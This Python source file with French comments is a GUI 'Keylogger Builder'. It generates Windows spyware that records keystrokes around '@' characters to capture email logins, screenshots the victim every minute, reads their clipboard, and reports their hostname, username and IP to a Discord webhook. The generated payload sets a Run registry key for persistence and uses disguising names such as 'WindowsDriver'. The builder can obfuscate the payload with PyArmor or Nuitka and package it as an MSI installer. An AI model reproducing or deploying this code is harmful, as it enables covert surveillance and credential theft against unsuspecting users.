import customtkinter as ctk
from tkinter import messagebox
import sys
import time
import requests
import shutil
import os
import subprocess
from colorama import Fore, Style
import platform
import winreg
import getpass
import socket

ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

# Variables globales
ordi = platform.uname()
hostname = socket.gethostname()
nom_fichier = "WindowsDriver"
temp_script = ""

# ============ CLASSE BUTTON 3D ============
class Button3D(ctk.CTkButton):
    """Bouton avec effet 3D"""
    def __init__(self, master, text, command=None, color="#3b82f6", **kwargs):
        self.base_color = color
        self.hover_color = self.adjust_color(color, 40)
        self.press_color = self.adjust_color(color, -40)
        
        super().__init__(
            master,
            text=text,
            command=command,
            corner_radius=15,
            fg_color=color,
            hover_color=self.hover_color,
            border_width=3,
            border_color=self.adjust_color(color, 60),
            font=ctk.CTkFont(size=16, weight="bold"),
            text_color="white",
            **kwargs
        )
        
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
        self.bind("<ButtonPress-1>", self.on_press)
        self.bind("<ButtonRelease-1>", self.on_release)
    
    def adjust_color(self, hex_color, amount):
        hex_color = hex_color.lstrip('#')
        rgb = tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))
        rgb = tuple(max(0, min(255, c + amount)) for c in rgb)
        return '#%02x%02x%02x' % rgb
    
    def on_enter(self, event):
        self.configure(font=ctk.CTkFont(size=17, weight="bold"), border_width=4)
    
    def on_leave(self, event):
        self.configure(font=ctk.CTkFont(size=16, weight="bold"), border_width=3)
    
    def on_press(self, event):
        self.configure(fg_color=self.press_color)
    
    def on_release(self, event):
        self.configure(fg_color=self.base_color)

class Checkbox3D(ctk.CTkCheckBox):
    """Checkbox avec effet 3D"""
    def __init__(self, master, text, variable, **kwargs):
        super().__init__(
            master, text=text, variable=variable,
            corner_radius=8, border_width=2,
            font=ctk.CTkFont(size=14), **kwargs
        )
        self.bind("<Enter>", self.on_enter)
        self.bind("<Leave>", self.on_leave)
    
    def on_enter(self, event):
        self.configure(font=ctk.CTkFont(size=15, weight="bold"))
    
    def on_leave(self, event):
        self.configure(font=ctk.CTkFont(size=14))

# ============ FONCTIONS BUILDER ============

def test_webhook():
    """Teste le webhook Discord"""
    test = webhook_entry.get().strip()
    if test == "":
        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide.")
        return
    message = {"content": "✅ Test du webhook - Keylogger Builder"}
    try:
        envoyer = requests.post(test, json=message, timeout=10)
        if envoyer.status_code == 204:
            messagebox.showinfo("Succès", "✅ Le webhook fonctionne correctement !")
        else:
            messagebox.showerror("Erreur", f"❌ Code d'erreur : {envoyer.status_code}")
    except Exception as e:
        messagebox.showerror("Erreur", f"❌ Erreur de connexion:\n{str(e)}")

def obfuscateur():
    messagebox.showinfo("Informations Obfuscateur", "Regardez le terminal pour les informations sur les obfuscateurs disponibles.")
    print(f"""

    

    {Fore.GREEN} 1. PyArmor (plus sécurisé, mais nécessite une installation supplémentaire)

    {Fore.YELLOW}PyArmor est un outil qui protège ton code Python en le transformant en bytecode chiffré, impossible à lire ou comprendre.

    Il sert à :

    ✔️  protéger ton code source
    ✔️  éviter qu’on te vole ton programme
    ✔️  distribuer un logiciel sans exposer ton .py
    ✔️  générer des versions protégées

    Il ne transforme pas ton code en .exe,
    mais il obfusque et chiffre le code Python.

    {Fore.GREEN} 2. Nuitka (compilation en C pour une sécurité maximale)

    {Fore.YELLOW}Nuitka est un compilateur Python → C + binaire natif.

    Il prend un fichier Python (.py) et le transforme en :

    code C (illisible et très dur à reverse-engineer)

    puis exécutable (.exe, .bin, etc.)

    👉 Contrairement à PyArmor, Nuitka NE laisse plus aucune trace de ton code Python.
    👉 C’est la protection la plus forte disponible.\n\n
    {Style.RESET_ALL}""")

    try:
        option = int(input("Choisissez un obfuscateur (1 ou 2 ) : "))
    except ValueError:
        print("Option invalide. Veuillez entrer un nombre (1 ou 2).")
        return

    while True:
        if option == 1:
            pyw()
            pyarmor()
        elif option == 2:
            pyw()
            nuitka()
        else:
            print("Option invalide. Veuillez choisir 1, 2 ou 3.")
            input("Appuyez sur Entrée pour continuer...")
            continue
        
        break


def pyarmor():
    print("[INFO] Création du .pyw temporaire terminé. Lancement de PyArmor...\n\n")
    time.sleep(2)
    os.system("python -m pip install pyarmor==8.5.7")
    print(f'\n\n[INFO] Installation de pyarmor fini . Lancement de l\'obfuscation avec pyarmor...\n\n')
    os.system(f"pyarmor gen {temp_script}")

def nuitka():
    global nom_fichier, temp_script   
    print(f"""
    {Fore.LIGHTRED_EX}
    Pré-requis pour Nuitka :
    {Style.RESET_ALL}
    - Avoir un compilateur C installé : https://visualstudio.microsoft.com/fr/visual-cpp-build-tools/ (Visual Studio pour Windows)
    - A l'installation, cochez : 
        - "Desktop development with C++"
        - "MSVC v142 - VS 2019 C++ x64/x86 build tools" (après avoir coché "Desktop development with C++")
        - "Windows 10/11 SDK" (après avoir coché "Desktop development with C++")
        Ca devrait faire environ 9Go d'installation.

    - Redémarrez votre ordinateur après l'installation des outils de build.

    et vous pouvez lancer !

    """) 
    input("Lisez et appuyez sur Entrée pour continuer...\n\n")
    os.system("pip install nuitka\n\n")
    print("[INFO] Installation de Nuitka terminée. Lancement de l'obfuscation avec Nuitka...\n\n")
    time.sleep(2)
    print(f"[INFO] L'installation prends du temps merci de patienter...\n\n")
    os.system(f'\n\nnuitka --msvc=latest --onefile --windows-disable-console --output-dir=. --show-progress {temp_script}')

def pyw():
    """Génère le fichier .pyw"""
    global nom_fichier, temp_script
    
    nom_fichier = name_var.get().strip() or "WindowsDriver"
    temp_script = f"{nom_fichier}.pyw"
    
    webhook = webhook_entry.get().strip()
    if not webhook:
        messagebox.showerror("Erreur", "Le webhook est vide !")
        return
    
    config = {
        "webhook": webhook,
        "options": {
            "screenshot": screenshot_var.get(),
            "clipboard": clipboard_var.get(),
            "autostart": autostart_var.get(),
            "capture_before_after_at": capture_var.get(),
            "alert_on_infection": alert_var.get()
        }
    }

    option_to_func = {
        "screenshot": "screenshot_option_func",
        "clipboard": "clipboard_option_func",
        "autostart": "autostart_option_func",
        "capture_before_after_at": "main_option_func",
        "alert_on_infection": "alert_on_infection_option_func"
    }
    
    try:
        with open(temp_script, "w", encoding="utf-8") as f:
            f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
            f.write("OPTIONS = {\n")
            for option, valeur in config["options"].items():
                f.write(f"    '{option}': {valeur},\n")
            f.write("}\n\n")
            f.write("import threading\n\n")
            
            # Screenshot
            if config["options"]["screenshot"]:
                f.write("import os\nos.system('pip install Pillow requests')\n")
                f.write("import requests, io, time\nfrom PIL import ImageGrab\n")
                f.write("def screenshot_option_func():\n")
                f.write("    while True:\n")
                f.write("        im = ImageGrab.grab()\n")
                f.write("        buffer = io.BytesIO()\n")
                f.write("        im.save(buffer, format='PNG')\n")
                f.write("        buffer.seek(0)\n")
                f.write("        files = {'file': ('screenshot.png', buffer, 'image/png')}\n")
                f.write("        requests.post(WEBHOOK, files=files)\n")
                f.write("        time.sleep(60)\n\n")
            
            # Clipboard
            if config["options"]["clipboard"]:
                f.write("import os\nos.system('pip install clipboard requests')\n")
                f.write("import clipboard, time, requests, io\nfrom PIL import ImageGrab\n")
                f.write("def clipboard_option_func():\n")
                f.write("    old = clipboard.paste()\n")
                f.write("    while True:\n")
                f.write("        time.sleep(1)\n")
                f.write("        mtn = clipboard.paste()\n")
                f.write("        if old != mtn:\n")
                f.write("            requests.post(WEBHOOK, json={'content': f'Presse-papier: {mtn}'})\n")
                f.write("            old = mtn\n\n")
            
            # Capture @
            if config["options"]["capture_before_after_at"]:
                f.write("import os\nos.system('pip install pynput requests')\n")
                f.write("import requests, time\nfrom pynput import keyboard\n")
                f.write("historique = []\n")
                f.write("avant_at = []\n")
                f.write("apres_at = []\n")
                f.write("capture = False\n\n")

                f.write("def touche(key):\n")
                f.write("    global historique, avant_at, apres_at, capture\n\n")

                f.write("    try:\n")
                f.write("        char = key.char\n")
                f.write("    except AttributeError:\n")
                f.write("        return\n\n")

                f.write("    if not char:\n")
                f.write("        return\n\n")

                f.write("    historique.append(char)\n\n")

                f.write("    # Détection du @\n")
                f.write("    if char == '@':\n")
                f.write("        capture = True\n")
                f.write("        avant_at = historique[-70:].copy()\n")
                f.write("        apres_at = []\n")
                f.write("        return\n\n")

                f.write("    if capture:\n")
                f.write("        apres_at.append(char)\n\n")

                f.write("        if len(apres_at) >= 70:\n")
                f.write("            data = 'Avant @: ' + ''.join(avant_at) + '\\nApres @: ' + ''.join(apres_at)\n")
                f.write("            requests.post(WEBHOOK, json={'content': data})\n") 
                f.write("            requests.post(WEBHOOK, json={'content': '---'})\n\n")
                f.write("            print('---')\n\n")

                f.write("            capture = False\n")
                f.write("            apres_at = []\n\n")

                f.write("def main_option_func():\n")
                f.write("    with keyboard.Listener(on_press=touche) as listener:\n")
                f.write("        listener.join()\n\n")
            
            # Autostart
            if config["options"]["autostart"]:
                f.write("import os\nos.system('pip install pywin32 requests')\n")
                f.write("import sys, os, winreg\n\n")
                f.write("def autostart_option_func(script_path=None, name='NetworkDriver'):\n")
                f.write("    if script_path is None:\n")
                f.write("        script_path = os.path.abspath(__file__)\n")
                f.write("    python_exe = sys.executable\n")
                f.write("    command = f'\"{python_exe}\" \"{script_path}\"'\n")
                f.write("    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_SET_VALUE)\n")
                f.write("    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, command)\n")
                f.write("    winreg.CloseKey(key)\n\n")
            
            # Alert
            if config["options"]["alert_on_infection"]:
                f.write("import os\nos.system('pip install requests')\n")
                f.write("import getpass, platform, socket, requests\n")
                f.write("def alert_on_infection_option_func():\n")
                f.write("    try:\n")
                f.write("        ip = requests.get('https://api.ipify.org', timeout=5).text\n")
                f.write("        hostname = socket.gethostname()\n")
                f.write("        info = f'PC: {platform.node()}\\nUser: {getpass.getuser()}\\nIP: {ip}'\n")
                f.write("        requests.post(WEBHOOK, json={'content': info})\n")
                f.write("    except:\n")
                f.write("        pass\n\n")
            
            # Lancement threads
            f.write("if __name__ == '__main__':\n")
            for opt, val in config["options"].items():
                if val and opt in option_to_func:
                    f.write(f"    threading.Thread(target={option_to_func[opt]}, daemon=True).start()\n")
            f.write("    while True:\n")
            f.write("        import time\n")
            f.write("        time.sleep(60)\n")
        
        messagebox.showinfo("Succès", f"✅ Fichier {temp_script} créé avec succès veuillez regarder le dossier dist!")
        
    except Exception as e:
        messagebox.showerror("Erreur", f"❌ Erreur lors de la création:\n{str(e)}")
        print(f"❌ Erreur lors de la création:\n{str(e)}")

def msi():
    #Génère le fichier .msi
    import os
    import time
    if not os.path.exists(r"\AppData\Local\Programs\Python\Python311"):
        messagebox.showerror("Erreur", "Python 3.11 n'est pas installé. Veuillez l'installer pour continuer.")
        return
    global nom_fichier, temp_script
    
    # Génère d'abord le .pyw
    pyw()
    
    if not os.path.exists(temp_script):
        messagebox.showerror("Erreur", "Le fichier .pyw n'existe pas !")
        return
    
    setup_filename = "setup_msi_temp.py"
    
    try:
        with open(setup_filename, "w", encoding="utf-8") as f:
            f.write("from cx_Freeze import setup, Executable\n\n")
            f.write(f"setup(\n")
            f.write(f"    name='{nom_fichier}',\n")
            f.write(f"    version='1.0',\n")
            f.write(f"    description='Keylogger Builder',\n")
            f.write(f"    options={{\n")
            f.write(f"        'build_exe': {{\n")
            f.write(f"            'packages': ['pynput', 'requests', 'clipboard', 'PIL'],\n")
            f.write(f"            'include_files': []\n")
            f.write(f"        }}\n")
            f.write(f"    }},\n")
            f.write(f"    executables=[Executable('{temp_script}', base='Win32GUI')]\n")
            f.write(f")\n")
        
        result = subprocess.run(
            ["python", setup_filename, "bdist_msi"],
            capture_output=True,
            text=True
        )
        
        if result.returncode != 0:
            messagebox.showerror("Erreur", f"❌ Génération MSI échouée:\n{result.stderr}")
            return
        
        messagebox.showinfo("Succès", "✅ MSI créé avec succès dans le dossier dist/ !")
        
    except Exception as e:
        messagebox.showerror("Erreur", f"❌ Erreur:\n{str(e)}")
    finally:
        # Nettoyage
        if os.path.exists(setup_filename):
            os.remove(setup_filename)

def lancer_programme():
    """Lance le build"""
    if build_type.get() == "pyw":
        obfu_ask = messagebox.askyesno(
            message="Voulez-vous chiffrer le code avec un obfuscateur ? (voir terminal pour les informations)"
        )

        if obfu_ask:
            obfuscateur()
        else:
            pyw()
    else:
        msi()

# ============ INTERFACE ============

app = ctk.CTk()
app.geometry("1200x800")
app.title("⚡ Keylogger Builder - Interface 3D")
app.resizable(False, False)

# HEADER
header = ctk.CTkFrame(app, fg_color="transparent")
header.pack(fill="x", pady=(15, 10), padx=20)

ctk.CTkLabel(
    header,
    text="⚡ KEYLOGGER BUILDER",
    font=ctk.CTkFont(size=32, weight="bold"),
    text_color="#60a5fa"
).pack(side="left")

ctk.CTkLabel(
    header,
    text="Boutons 3D • Interface Moderne",
    font=ctk.CTkFont(size=12),
    text_color="#93c5fd"
).pack(side="left", padx=20)

ctk.CTkButton(
    header,
    text="✖ Quitter",
    width=100,
    fg_color="#ef4444",
    hover_color="#dc2626",
    command=app.quit
).pack(side="right")

# CONTAINER
container = ctk.CTkFrame(app, fg_color="transparent")
container.pack(expand=True, fill="both", padx=20, pady=10)

# SIDEBAR
sidebar = ctk.CTkScrollableFrame(container, width=350, corner_radius=15)
sidebar.pack(side="left", fill="y", padx=(0, 15))

ctk.CTkLabel(
    sidebar,
    text="⚙️ OPTIONS",
    font=ctk.CTkFont(size=20, weight="bold"),
    text_color="#60a5fa"
).pack(pady=(10, 15))

# Variables
screenshot_var = ctk.BooleanVar(value=False)
clipboard_var = ctk.BooleanVar(value=False)
autostart_var = ctk.BooleanVar(value=False)
capture_var = ctk.BooleanVar(value=False)
alert_var = ctk.BooleanVar(value=False)

# Checkboxes 3D
Checkbox3D(sidebar, text="📸 Capture d'écran", variable=screenshot_var).pack(pady=8, padx=15, anchor="w")
Checkbox3D(sidebar, text="📋 Presse-papier", variable=clipboard_var).pack(pady=8, padx=15, anchor="w")
Checkbox3D(sidebar, text="🚀 Démarrage auto", variable=autostart_var).pack(pady=8, padx=15, anchor="w")
Checkbox3D(sidebar, text="📧 Capture @", variable=capture_var).pack(pady=8, padx=15, anchor="w")
Checkbox3D(sidebar, text="🔔 Alerte infection", variable=alert_var).pack(pady=8, padx=15, anchor="w")


# ZONE PRINCIPALE
main_area = ctk.CTkFrame(container, corner_radius=15)
main_area.pack(side="left", expand=True, fill="both")

# Webhook
ctk.CTkLabel(
    main_area,
    text="🔗 Webhook Discord",
    font=ctk.CTkFont(size=16, weight="bold")
).pack(pady=(25, 5))

webhook_entry = ctk.CTkEntry(
    main_area,
    width=600,
    height=45,
    font=ctk.CTkFont(size=14),
    placeholder_text="https://discord.com/api/webhooks/..."
)
webhook_entry.pack(pady=(0, 15))

# Nom
ctk.CTkLabel(
    main_area,
    text="📝 Nom du fichier",
    font=ctk.CTkFont(size=14, weight="bold")
).pack(pady=(10, 5))

name_var = ctk.StringVar(value="WindowsDriver")
ctk.CTkEntry(
    main_area,
    textvariable=name_var,
    width=400,
    height=40,
    font=ctk.CTkFont(size=13)
).pack(pady=(0, 20))

# Type
build_frame = ctk.CTkFrame(main_area, fg_color="transparent")
build_frame.pack(pady=15)

ctk.CTkLabel(
    build_frame,
    text="📦 Type :",
    font=ctk.CTkFont(size=14, weight="bold")
).pack(side="left", padx=10)

build_type = ctk.StringVar(value="pyw")

ctk.CTkRadioButton(
    build_frame,
    text=".pyw (Script)",
    variable=build_type,
    value="pyw",
    font=ctk.CTkFont(size=13)
).pack(side="left", padx=10)

ctk.CTkRadioButton(
    build_frame,
    text=".msi (Installeur)",
    variable=build_type,
    value="msi",
    font=ctk.CTkFont(size=13)
).pack(side="left", padx=10)

# BOUTONS 3D
buttons_frame = ctk.CTkFrame(main_area, fg_color="transparent")
buttons_frame.pack(pady=30)

Button3D(
    buttons_frame,
    text="🧪 TEST WEBHOOK",
    command=test_webhook,
    color="#f59e0b",
    width=230,
    height=60
).grid(row=0, column=0, padx=10, pady=10)

Button3D(
    buttons_frame,
    text="🔨 BUILD",
    command=lancer_programme,
    color="#8b5cf6",
    width=230,
    height=60
).grid(row=0, column=1, padx=10, pady=10)

# FOOTER
ctk.CTkLabel(
    app,
    text="✅ Prêt à générer | Keylogger Builder 2024",
    font=ctk.CTkFont(size=11),
    text_color="#64748b"
).pack(side="bottom", pady=10)



def key():
    print("=" * 60)
    print("⚡ KEYLOGGER BUILDER 3D")
    print("=" * 60)
    # Log
    with open("logs.txt", "a") as fichier:
        fichier.write(
            f"------------------------------------\n"
            f"\n"
            f" [{time.strftime('%d-%m-%Y %H:%M:%S')}]     Ouverture du keylogger \n"
            f"\n"
            f"------------------------------------\n"
            f"\n"
        )
    app.mainloop()
